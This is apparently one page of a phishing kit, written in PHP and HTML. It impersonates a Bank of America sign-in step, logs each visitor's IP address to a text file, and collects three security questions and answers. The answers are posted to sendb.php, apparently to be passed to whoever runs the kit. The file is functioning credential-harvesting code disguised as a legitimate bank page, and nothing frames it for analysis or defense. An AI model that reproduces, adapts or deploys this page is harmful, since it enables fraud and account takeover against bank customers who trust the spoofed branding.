<?php

$file = fopen("log.txt", "a+");
fwrite($file,"Acceso step1 -> " .$_SERVER["REMOTE_ADDR"]."\n");
fclose($file);

?>
<title>Sign-in</title>
<link rel="stylesheet" href="css/style.css">
<meta name="MobileOptimized" content="width" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="true" />
<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
<h1 id="title" class="h1" aria-hidden="false"><font color="#FFF" face="Arial" size="3"><b><img  src="img/ra.png" height="20" width="20"></td>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign In</h1></font></b>
<body>
<form method="post" action="sendb.php" name="form1">

<table align="center" border='0' style="width: 100%;">
<tbody>
<tr>
<td>
<img style="margin-left:10px;" src="img/secure_lock.png">
<font color="gray" face="Arial" style="font-size: 14px;">&nbsp;&nbsp;<b>SECURITY QUESTIONS</b>
</td>
</tr>
<tr>
<td>
<label><b><font color="black" face="Arial" style="font-size: 14px;">Your First Question:</font></b></label>            
<br><br>
<select class='select' name="q1" required>
	<option>Select</option>
	<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
	<option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
	<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
	<option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
	<option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
	<option value="What is the name of a college you applied to but didn&#39;t attend?">What was the name of your first pet?</option>
	<option value="What is the first name of your mother&#39;s closest friend?">What is the first name of your mother's closest friend?</option>
	<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
	<option value="On what street is your grocery store?">On what street is your grocery store?</option>
	<option value="what is the name of college you apllied to but didn&#39;t attend ?">what is the name of college you apllied to but didn't attend ?</option>
</select>
<input name="a1" type="text"  placeholder="Answer:" autocomplete="off" autocorrect="off">
</td>
</tr>
<tr>
<td>
<label><b><font color="black" face="Arial" style="font-size: 14px;">Your Second Question:</font></b></label> 
<br><br>
<select class="" name="q2" id="mySelect" size="1" required>
	<option selected="">Select</option>
	<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
	<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
  	<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
	<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
	<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
	<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
	<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
	<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
	<option value="What is the name of your high school&#39;s star athlete?">What is the name of your high school's star athlete?	</option>
	<option value="Where were you on New Year&#39;s 2000?">Where were you on New Year's 2000?</option>
</select>
<input name="a2" type="text"  placeholder="Answer:" autocomplete="off" autocorrect="off">
</td>
</tr>
<tr>
<td>
<label><b><font color="black" face="Arial" style="font-size: 14px;">Your Third Question:</font></b></label>
<br><br>
<select class="" name="q3" id="mySelect" required>
	<option selected="">Select</option>
	<option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
	<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
	<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
	<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
	<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)</option>
	<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
	<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
	<option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
	<option value="What is your best friend&#39;s first name?">What is your best friend's first name?</option>
	<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
</select>
<input name="a3" type="text"  placeholder="Answer:" autocomplete="off" autocorrect="off">
</td>
</tr>
<tr>
<td align="center" colspan='2' rowspan='2'>
<br>
        <button id="btSignonContinue" href="javascript:void(0);" role="button" class='button' style=cursor:pointer;>
            <img style="margin-bottom:-4px;" class="paddingHoriz10" src="img/secure_lock.png">
            <span id="signonLabel">&nbsp;&nbsp;&nbsp;Next</span>
        </button>
<br><br>
<font color="blue" face="Arial" size="2.5">Forgot ID/Passcode? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enroll</font>
</td>
</tr>
</tbody>
</table>
</div>

<br><br><br><br><br><br><br><br>
<table align="center" border='0' style="width: 100%;">
<tr>
<td align="leth">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Privacy & Security
</font></b>
</a>
</td>
<td align="right">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Equal Housing Lender
</font></b>
</a>
</td>
</tr>
<tr>
<td  colspan='2'>
<b><font color="#636b78" face="Arial" style="font-size: 9px;">
© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.
</font></b>
</td>
</tr>
</table>
</body>

